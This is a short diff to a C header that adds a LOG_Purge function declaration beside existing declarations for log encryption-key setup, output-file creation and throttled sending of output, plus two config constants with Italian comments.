@@ -23,6 +23,7 @@ extern void LOG_InitCryptKey(BYTE *, BYTE *);
 extern void LOG_InitSequentialLogs();
 extern HANDLE Log_CreateOutputFile(char *command_name);
 extern BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep);
+extern void LOG_Purge(long long f_time, DWORD size);
 
 #define LOG_CONF_NEW_FILE 0  // c'e' un nuovo file
 #define LOG_CONF_NOP      1  // non c'e' un nuovo file
